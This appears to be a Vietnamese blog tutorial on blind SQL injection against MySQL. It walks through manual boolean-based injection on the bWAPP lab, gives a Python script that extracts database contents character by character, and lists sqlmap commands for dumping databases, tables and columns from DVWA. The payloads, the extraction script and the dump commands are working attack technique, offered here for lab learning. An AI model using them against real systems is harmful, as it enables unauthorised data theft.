![](https://images.viblo.asia/a3e3d9f5-fd3a-4d45-8977-814ac7409a9f.jpg)

Trong bài trước tôi có nói cơ bản về lỗ hổng SQL injection [**link**](https://viblo.asia/p/tan-cong-sql-injection-bJzKmRPBZ9N)
. Trong bài này, ta sẽ đi tìm hiểu về blind SQL injection và cách khai thác. Như đã có nói trong bài trước, blind SQLi là lỗ hổng SQLi mà kết quả trả về khó có thể phát hiện bằng mắt. Blind SQLi lại có 2 kiểu là: 
+ Boolean-base: là kiểu ta có chèn toán tử boolean vào trong câu truy vấn.
+ Time-base: là kiểu ta có thể chèn hàm thời gian vào trong câu truy vấn.

# Khai thác thủ công
Trong thực tế khai thác lỗi blind SQLi thì ta sẽ dùng tool luôn cho nhanh. Nhưng với sự đam mê và lòng nhiệt huyết tìm hiểu kiến thức thì ta cần hiểu được tool hoạt động dựa trên cái gì. Vì vậy, trước khi tìm hiểu khai thác bằng tool thì ta sẽ tìm hiểu cách khai thác thủ công trước. Khai thác thủ công giúp cho ta hiểu lỗi một cách sâu sắc và đầy đủ. Trong bài sẽ giới hạn ở hệ quản trị cơ sở dữ liệu MySQL và phần demo là beewap bài Boolean-SQLi (time-base khai thác tương tự nhưng dùng hàm `sleep` thay vì dùng toán tử boolean).

![](https://images.viblo.asia/e941939e-6642-49bb-aa2e-6c385eded886.png)

## Xác định lỗi
Điều cần làm đầu tiên là xác định mục tiêu của ta có bị lỗi SQLi không? Do lab là boolean-base nên ta chèn các payload boolean vào ô tìm kiếm và so sánh kết quả từ đó đưa ra nhận xét. Còn trong thực tế ta cần phải gửi các loại payload SQLi khác nhau thì mới đánh giá đúng đắn được. Do đây là lab nên ta đi tắt một đoạn.

**Nhập dữ liệu bình thường**

Đầu tiên ta điền dữ liệu bất kỳ như người dùng bình thường để kiểm tra. Trong khi viết bài tôi điền giá trị là **boolean** (điền gì cũng được).

![](https://images.viblo.asia/26438d90-d205-4ae5-a9bf-bf61d3221651.png)

Như ta thấy trên hình có dòng chữ  **The movie does not exist in our database!**, tạm lưu lại và để sử dụng cho lần sau.

**Nhập payload SQLi**

Sau khi nhập dữ liệu bình thường tiếp đó ta chèn payload SQLi và đem kết quả nhận được so sánh với kết quả khi nhập dữ liệu bình thường.

![](https://images.viblo.asia/cb5518d3-3828-4106-887b-29531f400443.png)

Với payload nhập vào là `boolean' or 1=1#` thì ta nhận được kết quả là **The movie exists in our database!** thay vì **The movie does not exist in our database!**. Đến đây ta nghi rằng ô tìm kiếm có thể dính lỗi SQLi, để chắc chắn hơn nữa ta sửa payload trên một chút thành `boolean' or 1=2#`.

![](https://images.viblo.asia/f4dfc20f-3b26-456f-8bdf-2f51590f67c1.png)

Sau khi sửa payload thì kết quả trả về lại giống như khi ta nhập giá trị bình thường. Đến đây ta đã chắc chắn là ô tìm kiếm này bị lỗi boolean-base SQLi. Từ những điều trên ta có thể phỏng đoán rằng câu truy vấn SQL có thể là sư sau:
```sql
SELECT * FROM table_movie WHERE movie='$_GET["title"]'
```
 Khi người dùng nhập payload SQLi vào thì câu truy vấn sẽ trở thành như sau
 ```sql
 SELECT * FROM table_movie WHERE movie='boolean' or 1=1#'
 ```
 Lưu ý ký tự `#` trong SQL tất cả ký tự sau dấu `#` sẽ coi là chú thích và được bỏ qua khi câu lệnh thực hiện.
 
 Đối với blind SQLi điều quan trọng nhất ta phải tìm ra sự khác biệt giữa kết quả của câu truy vấn có kết quả và không có kết quả. Trong trường hợp này là:
 + **The movie does not exist in our database!**: truy vấn không có kết quả
 + **The movie exists in our database!**: truy vấn có kết quả
 
 ## Khai thác
 Khi đã chắc chắn có lỗi, tiếp theo ta sẽ tiến hành khai thác và tên database hiện tại sẽ được lấy ra đầu tiên để biết ta đang có quyền làm việc trên database nào. Muốn xác định tên database đầu tiên ta cần xác định độ dài tên database sau đó mới tìm tên database.
 
 Xác định độ dài tên database
 ```sql
 boolean' or length((select database()))=1#
 ```
 Sau khi đưa vào **Intruder** (có thể dùng tool khác nhưng trong trường hợp này thì intruder là tiện nhất) trong burpsuite ta đã thành công ra được độ dài tên database là **5**
 
![](https://images.viblo.asia/f3bf1a85-29b8-4e79-8de4-53cb8a8aa6be.png)

Sau khi đã có được độ dài tên database tiếp đến ta sẽ tìm tên database.
```sql
boolean' or substring((select database()),1,1)='a'#
```
Ta sẽ thay đổi phần `offset` hàm `substring` và ký tự so sánh `a` để tìm ra tên database. Tôi đã viết một đoạn code để làm việc này.
```python
import sys, requests, urllib.parse, string

query = sys.argv[1]
lent = 5
printable = string.printable
url = 'http://pwnme.me:8088/sqli_4.php?action=search&title='
headers = {
    'Cookie': 'PHPSESSID=jl30c09gnro3mourbi9mcl1cs7; security_level=0'
}

def get(query=''):
    global lent, printable, url, headers
    result = ''
    for i in range(1,lent+1):
        for c in printable:
            c = urllib.parse.quote(c)
            payload = "boolean'+or+substring((select+%s),%d,1)='%s'%%23"%(query, i, c)
            resp = requests.get(url+payload, headers=headers)
            if 'The movie exists in our database!' in resp.text:
                c = urllib.parse.unquote(c)
                print("Found: %s"%c)
                result += c
                break
    return result

print(get(query))
```

![](https://images.viblo.asia/051d1cef-385d-4584-87d1-b69968265185.png)

Để tiến hành khai thác sâu hơn ta chỉ cần sửa đổi `database()` thành các câu truy vấn đến kết quả mà ta muốn có

**Lấy trên table**
```sql
SELECT table_name FROM information_schema.tables
```

**Lấy colums**
```sql
SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME  ='tên table muốn có';
```

**Lấy dữ liệu của một table**
```sql
SELECT user FROM table WHERE condition='condition'
```

# Khai thác bằng sqlmap
Cách đơn giản để khai thác lỗi SQLi nói chung và Blind SQLi nói riêng là sử dụng tool. Tool hay được sử dụng là slqmap, tool này hay được nói đùa là có tích hợp AI vì nó thực sự rất tuyệt. Sqlmap có thể khai thác được hầu hết các lỗi SQL trong thực tế và nó rất dễ dàng sử dụng. Với sqlmap thì ta chỉ việc truyền end-point và việc còn lại đã có sqlmap.
## Cài đặt sqlmap
Cài đặt sqlmap cực kì đơn giản trên cả Windows và Linux. Để sử dụng được slqmap thì cần phải cài đặt [**python**](https://www.python.org/) trước. Sau khi cài đặt xong python rồi sẽ tiến hành cài đặt sqlmap

**Linux**

Đối với linux ta có thể thực hiện cài sqlmap bằng câu lệnh trực tiếp hoặc có thể tải file nén về giải nén ra và chạy. Trong hướng dẫn này tôi sử dụng cách cài bằng câu lệnh.
```bash
sudo apt-get install sqlmap -y
```

**Windows**

Với Windows thì ta sẽ tải file .zip về và giải nén ra. Sau khi giải nén ta di chuyển vào thư mục sqlmap đã giải nén và chạy lệnh để sử dụng sqlmap

```bash
python ./sqlmap.py
```

## Khai thác SQLi với sqlmap
Nếu ta không biết sử dụng sqlmap ta có thể mở help với câu lệnh
```bash
sqlmap --help
hoặc
sqlmap -hh # nâng cao
```

Đầu tiên để khai thác ta cần có mục tiêu, trong bài này tôi sẽ dùng [**dvwa**](http://www.dvwa.co.uk/) (website chứa các bài lab cho ta thực hành).

![](https://images.viblo.asia/8d830d02-fe04-4ba3-ae91-d2279b0dfc2e.png)

Trên là giao diện sau khi đã cài đặt và login thành công và chọn phần blind SQLi. Với thiết kế lab thì ta đã biết rõ là ô tìm kiếm trên có xuất hiện lỗ hổng SQLi. Nhưng trong thực tế thì không có chuyện đơn giản như vậy. Điều đầu tiên ta cần làm là phải xác định xem có phải ô tìm kiếm là có khả năng bị lỗi SQLi không? Để kiểm tra ta điền vài payload đơn giản như sau:
+ `'` nếu xuất hiện báo lỗi syntax SQL thì có khả năng khai thác được SQLi
+ `' or 1=1#` và `' or 1=2#` nếu 2 kết quả có khác nhau thì có khả năng bị SQLi
+ `' or sleep(5)#` nếu thời gian phản hồi của trang lớn hơn 5 giây thì có thể bị SQLi

Trong bài lab này tôi đã thành công với payload `'or sleep(5)#` vậy là ô tìm kiếm này đã bị lỗi Time-base SQLi. Ta tiến thành khai thác với qlmap. 

Đầu tiên ta chạy thử với dữ liệu nhập vào bình thường, sau đó bắt requests với burpsuite và lưu vào file. Sqlmap có tính năng rất tiện lợi đó là đọc request từ file burp và thực hiện khai thác.

```html
GET /vulnerabilities/sqli_blind/?id=1&Submit=Submit HTTP/1.1
Host: pwnme.me:8088
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: security=low; PHPSESSID=gk42trrcvh982vabnakg3o7l14; security=low
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```

```bash
sqlmap -r dum -p id --technique=T
```
+ `-r dum` đọc file dum
+ `-p` chỉ định param để sqlmap chèn payload vào
+ `--technique` là kiểu có lỗi SQL mặc định là **BEUSTQ** ở đây tôi chỉ muốn Time-base nên tôi để là **T**

Sau khi chạy xong nếu kết quả hiện ra payload thì end-point đó chắc chắn bị lỗi rồi.

![](https://images.viblo.asia/31ac0e30-3ad5-4837-b474-d42528735184.png)

Đã xác định có lỗi tiếp theo ta có thể tiến hành khai thác sâu hơn như: dump tất cả tên database, hiển thị bảng, hiển thị cột, ...

Hiển thị tất cả tên **database**
```bash
sqlmap -r dum -p id --technique=T --dbs --threads 10
```

Hiển thị tất cả **table** trong **database**
```bash
sqlmap -r dum -p id --technique=T --threads 10 -D <tên database> --tables
```

Hiển thị tất cả **column** có trong **table**
```bash
sqlmap -r dum -p id --technique=T --threads 10 -D <tên database> T <tên table> --columns
```

Dump dữ liệu của **columns**, **table**, **database** bất kỳ
```bash
# dump một cột
sqlmap -r dum -p id --technique=T --threads 10 -D <tên database> T <tên table> -C <tên column> --dump
#dump một table
sqlmap -r dum -p id --technique=T --threads 10 -D <tên database> T <tên table> --dump
#dump database
sqlmap -r dum -p id --technique=T --threads 10 -D <tên database> --dump
```